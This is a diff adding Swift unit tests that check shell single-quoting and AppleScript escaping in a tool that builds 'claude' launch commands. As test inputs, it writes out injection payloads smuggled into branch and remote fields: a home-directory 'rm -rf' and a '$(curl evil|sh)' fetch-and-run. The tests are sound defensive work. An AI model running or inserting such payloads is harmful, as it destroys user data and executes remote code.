@@ -103,6 +103,51 @@ final class CommandTemplateTests: XCTestCase {
         XCTAssertFalse(out.contains("\t"))
         XCTAssertEqual(out, "claude 'line1 rm -rf ~ tab'")
     }
+
+    // S2: a .git/HEAD or .git/config with adversarial content flows into {branch}/{remote};
+    // both must be single-quoted just like repo path/name.
+    func testBranchAndRemoteQuoted() {
+        let c = CommandTemplate.Context(
+            repo: Repo(path: "/x", name: "x"), mode: .defaultMode(), prompt: nil,
+            branch: "a'; rm -rf ~ #", remote: "$(curl evil|sh)", worktreePath: nil)
+        let out = CommandTemplate.preview("claude --branch {branch} --remote {remote}", context: c)
+        // The injected `'` is escaped as '\'' so the rm/curl payloads stay inside single quotes.
+        XCTAssertEqual(out, "claude --branch 'a'\\''; rm -rf ~ #' --remote '$(curl evil|sh)'")
+    }
+}
+
+// S2: the AppleScript escaping layer (iTerm2 / Terminal.app `do script "…"`) was untested.
+final class AppleScriptEscapeTests: XCTestCase {
+    func testDoubleQuoteEscaped() {
+        XCTAssertEqual(appleScriptEscape("say \"hi\""), "say \\\"hi\\\"")
+    }
+
+    func testBackslashEscapedBeforeQuote() {
+        // A backslash-then-quote must become \\ then \" — not \\" (which would be backslash + literal quote).
+        XCTAssertEqual(appleScriptEscape("a\\\"b"), "a\\\\\\\"b")
+    }
+
+    func testNewlineAndCarriageReturnCollapsed() {
+        XCTAssertEqual(appleScriptEscape("a\nb\rc"), "a b c")
+        XCTAssertFalse(appleScriptEscape("x\ny").contains("\n"))
+    }
+
+    // End-to-end: an adversarial branch survives shell single-quoting, then the assembled
+    // `cd 'wd' && cmd` is AppleScript-escaped with no unescaped double quote left to break the literal.
+    func testEndToEndShellThenAppleScriptNoUnescapedQuote() {
+        let c = CommandTemplate.Context(
+            repo: Repo(path: "/Users/me/acme", name: "acme"), mode: .defaultMode(),
+            prompt: "say \"done\"", branch: "a\"b", remote: nil, worktreePath: nil)
+        let command = CommandTemplate.preview("claude --branch {branch} {prompt}", context: c)
+        let assembled = "cd '/Users/me/acme' && \(command)"
+        let escaped = appleScriptEscape(assembled)
+        // Every literal double quote in the assembled command must be backslash-escaped.
+        var prev: Character = " "
+        for ch in escaped {
+            if ch == "\"" { XCTAssertEqual(prev, "\\", "unescaped double quote in AppleScript literal: \(escaped)") }
+            prev = ch
+        }
+    }
 }
 
 final class LaunchResolutionTests: XCTestCase {
